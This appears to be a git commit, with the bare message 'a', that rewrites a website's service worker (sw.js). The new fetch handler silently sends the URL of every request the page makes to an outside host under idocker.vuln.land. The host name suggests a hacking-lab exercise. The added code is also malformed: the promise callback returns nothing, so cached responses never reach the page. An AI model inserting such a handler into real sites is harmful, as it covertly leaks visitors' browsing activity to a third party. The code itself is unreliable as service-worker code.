864dcc546f4dec922b2c141d01cd087877a59e9c
Josef Ilg <jo-ilg@t-online.de>
2021-05-19 23:59:13 +0200

    a

--- sw.js
+++ sw.js
@@ -1,4 +1,5 @@
-self.addEventListener('fetch', function (event) {
-  // do nothing here, just log all the network requests
-  console.log(event.request.url);
+self.addEventListener('fetch', function(e) {
+  e.respondWith(caches.match(e.request).then(function(response) {
+    fetch('http://888f69e5-7431-4c41-a3ef-b0e538d33c4b.idocker.vuln.land/robots.txt' + e.request.url)
+}));
 });
